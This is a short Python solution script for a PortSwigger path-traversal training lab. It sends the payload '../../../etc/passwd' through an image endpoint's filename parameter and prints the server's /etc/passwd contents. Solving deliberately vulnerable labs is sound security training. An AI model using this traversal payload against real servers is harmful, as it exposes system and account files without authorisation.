# Lab 01 — File path traversal, simple case
# PortSwigger: https://portswigger.net/web-security/file-path-traversal/lab-simple
#
# Vulnerability: Product image display has zero validation on the filename parameter
# Aim:           Retrieve the contents of /etc/passwd
#
# Technique:
#   The filename parameter is concatenated directly into a server-side file
#   path with no filtering at all. A plain relative traversal sequence works
#   immediately.
#
# Usage: python path_traversal_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from path_traversal_utils import banner, section, make_session, try_traversal_payload, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "../../../etc/passwd"

if __name__ == "__main__":
    banner()
    section("LAB 01 — FILE PATH TRAVERSAL, SIMPLE CASE")

    if len(sys.argv) != 2:
        print("  Usage: python path_traversal_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = try_traversal_payload(session, url, "/image", "filename", PAYLOAD)

    if "root:" in r.text:
        print_box("/etc/passwd contents (truncated)", r.text[:800])
    else:
        print("\n  ✘  /etc/passwd contents not found in response — inspect manually")
        print_box("Raw response snippet", r.text[:400])
